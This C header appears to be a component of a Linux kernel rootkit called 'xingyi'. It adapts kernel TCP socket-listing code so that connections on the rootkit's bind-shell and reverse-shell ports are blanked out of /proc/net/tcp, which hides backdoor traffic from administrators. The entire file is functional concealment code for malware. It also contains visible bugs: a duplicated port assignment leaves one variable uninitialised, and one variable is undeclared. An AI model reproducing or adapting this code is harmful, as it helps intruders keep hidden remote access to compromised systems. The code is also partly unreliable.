#ifndef _xingyi_tcpseq_2.6.25_H_
#define _xingyi_tcpseq_2.6.25_H_

/* modified from original linux kernel source code at /usr/src/linux/net/ipv4/tcp_ipv4.c */

static void _rk_get_openreq4(struct sock *sk, struct request_sock *req, char *tmpbuf, int i, int uid)
{
	const struct inet_request_sock *ireq = inet_rsk(req);
	int ttd = req->expires - jiffies;
	char rkport[12];
	char rkport2[12];
	char inet_sport[12];
	char rmt_port[12];
	int _hook;

	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport2, "%04X", reverse_shell_port);
	sprintf(inet_sport, "%04X", ntohs(inet_sk(sk)->sport));
	sprintf(rmt_port, "%04X", ntohs(ireq->rmt_port));
	if ((strcmp(inet_sport, rkport) != 0) && (strcmp(rmt_port, rkport) != 0) && (strcmp(inet_sport, rkport2) != 0) && (strcmp(rmt_port, rkport2) != 0)) 
		_hook = 0;
	else
		_hook = 1;
	if (_hook == 0) 	
		sprintf(tmpbuf, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %u %d %p",
		i,
		ireq->loc_addr,
		ntohs(inet_sk(sk)->sport),
		ireq->rmt_addr,
		ntohs(ireq->rmt_port),
		TCP_SYN_RECV,
		0, 0, /* could print option size, but that is af dependent. */
		1,    /* timers active (only the expire timer) */
		jiffies_to_clock_t(ttd),
		req->retrans,
		uid,
		0,  /* non standard timer */
		0, /* open_requests have no inode */
		atomic_read(&sk->sk_refcnt),
		req);
	else
		sprintf(tmpbuf, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %u %d %p",
		i,
		0,
		ntohs(0),
		0,
		ntohs(0),
		TCP_SYN_RECV,
		0, 0, /* could print option size, but that is af dependent. */
		1,    /* timers active (only the expire timer) */
		jiffies_to_clock_t(ttd),
		req->retrans,
		uid,
		0,  /* non standard timer */
		0, /* open_requests have no inode */
		atomic_read(&sk->sk_refcnt),
		req);
}

static void _rk_get_tcp4_sock(struct sock *sk, char *tmpbuf, int i)
{
	int timer_active;
	unsigned long timer_expires;
	struct tcp_sock *tp = tcp_sk(sk);
	const struct inet_connection_sock *icsk = inet_csk(sk);
	struct inet_sock *inet = inet_sk(sk);
	__be32 dest = inet->daddr;
	__be32 src = inet->rcv_saddr;
	__u16 destp = ntohs(inet->dport);
	__u16 srcp = ntohs(inet->sport);
	char rkport[12];
	char rkport2[12];
	char dest_port[12];
	char src_port[12];

	if (icsk->icsk_pending == ICSK_TIME_RETRANS) {
		timer_active	= 1;
		timer_expires	= icsk->icsk_timeout;
	} else if (icsk->icsk_pending == ICSK_TIME_PROBE0) {
		timer_active	= 4;
		timer_expires	= icsk->icsk_timeout;
	} else if (timer_pending(&sk->sk_timer)) {
		timer_active	= 2;
		timer_expires	= sk->sk_timer.expires;
	} else {
		timer_active	= 0;
		timer_expires = jiffies;
	}
	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport, "%04X", reverse_shell_port);
	sprintf(dest_port, "%04X", destp);
	sprintf(src_port, "%04X", srcp);
	if ((strcmp(dest_port, rkport) != 0) && (strcmp(src_port, rkport) != 0) && (strcmp(dest_port, rkport2) != 0) && (strcmp(src_port, rkport2) != 0)) 
		_hook = 0;
	else {

		_hook = 1;	
		srcp = 0;
		src = 0;
		destp = 0;
		dest = 0;
	}
	sprintf(tmpbuf, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5d %8d %lu %d %p %u %u %u %u %d",
		i, src, srcp, dest, destp, sk->sk_state,
		tp->write_seq - tp->snd_una,
		sk->sk_state == TCP_LISTEN ? sk->sk_ack_backlog :
					     (tp->rcv_nxt - tp->copied_seq),
		timer_active,
		jiffies_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		sock_i_uid(sk),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		atomic_read(&sk->sk_refcnt), sk,
		icsk->icsk_rto,
		icsk->icsk_ack.ato,
		(icsk->icsk_ack.quick << 1) | icsk->icsk_ack.pingpong,
		tp->snd_cwnd,
		tp->snd_ssthresh >= 0xFFFF ? -1 : tp->snd_ssthresh);
}

static void _rk_get_timewait4_sock(struct inet_timewait_sock *tw, char *tmpbuf, int i)
{
	__be32 dest, src;
	__u16 destp, srcp;
	int ttd = tw->tw_ttd - jiffies;
	char rkport[12];
	char rkport2[12];
	char dest_port[12];
	char src_port[12];
	int _hook;

	if (ttd < 0)
		ttd = 0;

	dest  = tw->tw_daddr;
	src   = tw->tw_rcv_saddr;
	destp = ntohs(tw->tw_dport);
	srcp  = ntohs(tw->tw_sport);
	sprintf(dest_port, "%04X", destp);
	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport2, "%04X", reverse_shell_port);
	sprintf(src_port, "%04X", srcp);
	if ((strcmp(dest_port, rkport) != 0) && (strcmp(src_port, rkport) != 0) && (strcmp(dest_port, rkport2) != 0) && (strcmp(src_port, rkport2) != 0)) 
		_hook = 0;
	else {
		_hook = 1; 
		srcp = 0;
		src = 0;
		destp = 0;
		dest = 0;
	}
	sprintf(tmpbuf, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %d %d %p",
		i, src, srcp, dest, destp, tw->tw_substate, 0, 0,
		3, jiffies_to_clock_t(ttd), 0, 0, 0, 0,
		atomic_read(&tw->tw_refcnt), tw);
}

#endif

